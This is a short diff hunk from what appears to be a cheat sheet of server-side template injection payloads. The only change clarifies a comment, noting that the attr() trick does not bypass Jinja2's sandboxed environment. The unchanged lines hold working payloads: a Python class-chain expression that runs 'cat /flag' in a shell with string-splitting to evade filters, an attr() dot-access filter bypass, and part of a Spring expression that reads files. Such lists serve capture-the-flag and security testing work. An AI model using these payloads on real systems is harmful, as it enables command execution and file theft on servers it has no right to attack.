@@ -204,7 +204,7 @@ ${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray
 # Using chr() to bypass filters
 {{''.__class__.__mro__[1].__subclasses__()[X]('cat /flag'.replace('flag','fl'+'ag'),shell=True,stdout=-1).communicate()}}
 
-# attr() filter bypasses dot-access filter
+# attr() filter bypasses dot-access filter (but does NOT bypass Jinja2 SandboxedEnvironment)
 {{''|attr('__cla'+'ss__')}}
 
 # Format string trick for blocked periods
